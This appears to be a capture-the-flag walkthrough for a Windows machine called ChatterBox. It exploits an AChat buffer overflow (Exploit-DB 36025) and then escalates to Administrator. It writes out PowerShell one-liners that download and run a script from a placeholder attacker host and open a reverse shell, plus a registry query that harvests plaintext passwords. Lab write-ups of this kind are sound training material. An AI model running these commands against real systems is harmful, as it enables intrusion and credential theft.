# ChatterBox - Walkthrough

## 🧗 Initial Foothold

### 🔎 1. Nmap Scanning
- Ran `nmap` **three times** to catch unusual services.
- Identified **AChat chat service** running on ports `9255` and `9256`.

### 💣 2. Exploit AChat Buffer Overflow
- Found exploit:
  [Exploit-DB 36025](https://www.exploit-db.com/exploits/36025)
- Adjusted the Python exploit to include a reverse shell:
  - Created shell with `msfvenom`
  - Injected payload using the `CMD` variable:
    ```powershell
    CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://<YOUR_IP>:<PORT>/shell.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <YOUR_IP> -Port <PORT>\""
    ```
- Ran the exploit using:
  ```bash
  python2 36025.py
  ```
- Reverse shell received.

---

## ⚙️ Privilege Escalation

### 🔍 1. Registry Enumeration
- Used this command to search for passwords in the registry:
  ```powershell
  reg query HKLM /f password /t REG_SZ /s
  ```
- If interesting results were found, queried the specific key:
  ```powershell
  reg query "HKEY\...fullpath"
  ```

### 🔐 2. Discovered Alfred's Password
- Used `reg query` output to recover a password.
- Suspected **Alfred = Administrator**, based on access to Desktop folder.

### 🛠️ 3. Creating Credential Object
```powershell
$cred = New-Object System.Management.Automation.PSCredential("Administrator", (ConvertTo-SecureString "AlfredsPassword" -AsPlainText -Force))
```

### 🧨 4. Triggering New Reverse Shell
- Used the credentials object to run reverse shell again:
```powershell
Start-Process -FilePath "powershell" -ArgumentList "IEX(New-Object Net.WebClient).downloadString('http://<YOUR_IP>:<PORT>/shell.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <YOUR_IP> -Port <PORT>" -Credential $cred
```

---

## 🧠 Notes

- Be patient with Nmap — some services only show up intermittently.
- AChat is a classic buffer overflow example.
- Windows registry is gold for plaintext creds.
- `Start-Process` with `-Credential` lets you escalate with known passwords.
